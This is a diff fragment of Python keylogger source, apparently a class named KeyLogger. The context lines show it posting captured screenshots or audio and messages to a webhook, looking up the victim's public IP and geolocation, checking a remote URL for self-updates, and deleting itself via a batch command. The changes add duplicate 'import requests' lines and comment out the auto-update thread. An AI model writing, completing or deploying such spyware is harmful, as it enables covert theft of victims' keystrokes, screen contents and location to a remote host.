@@ -534,12 +534,14 @@ finally:
             # If there's a file, we send it as multipart/form-data
             # If it's just text, we send a JSON payload
             try:
+                import requests
                 if file_path:
                     # Posting a file (screenshot or audio)
                     with open(file_path, 'rb') as f:
                         # We can send 'content' along with the file
                         data = {'content': message}
                         files = {'file': f}
+                        import requests
                         requests.post(self.webhook_url, data=data, files=files)
                 else:
                     # Posting just text
@@ -581,6 +583,7 @@ finally:
             
             # Fetch Public IP and Geo Info
             try:
+                import requests
                 public_ip = requests.get('https://api.ipify.org').text
                 geo_request = requests.get(f'http://ip-api.com/json/{public_ip}')
                 geo_data = geo_request.json()
@@ -662,6 +665,7 @@ finally:
 
         def check_for_updates(self):
             try:
+                import requests
                 # 1. Check Remote Version
                 response = requests.get(VERSION_URL)
                 remote_version = response.text.strip()
@@ -747,8 +751,9 @@ del "%~f0"
         keylogger = KeyLogger(SEND_REPORT_EVERY, WEBHOOK_URL)
         
         # Check for updates on startup
-        if getattr(sys, 'frozen', False): # Only auto-update if running as exe
-            Thread(target=keylogger.check_for_updates).start()
+        # Check for updates on startup
+        # if getattr(sys, 'frozen', False): # Only auto-update if running as exe
+        #     Thread(target=keylogger.check_for_updates).start()
 
         # We must run the GUI on the Main Thread.
         # The Keylogger must run in a background thread.
